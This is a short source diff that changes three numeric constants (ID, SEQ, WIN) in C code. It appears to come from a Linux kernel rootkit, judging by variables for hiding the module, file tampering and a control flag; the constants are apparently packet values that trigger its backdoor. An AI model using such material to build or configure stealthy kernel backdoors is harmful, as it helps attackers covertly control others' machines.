@@ -57,9 +57,9 @@
  *  All these definitions below is random and can be changed if you want
  *  But make sure you will change that in sbin/util.h
  */
-#define ID 12345
-#define SEQ 28782
-#define WIN 8192
+#define ID 3429
+#define SEQ 15123
+#define WIN 9965
 
 int hidden = 1, hide_module = 0, file_tampering = 0, control_flag = 0;
 struct workqueue_struct *work_queue;
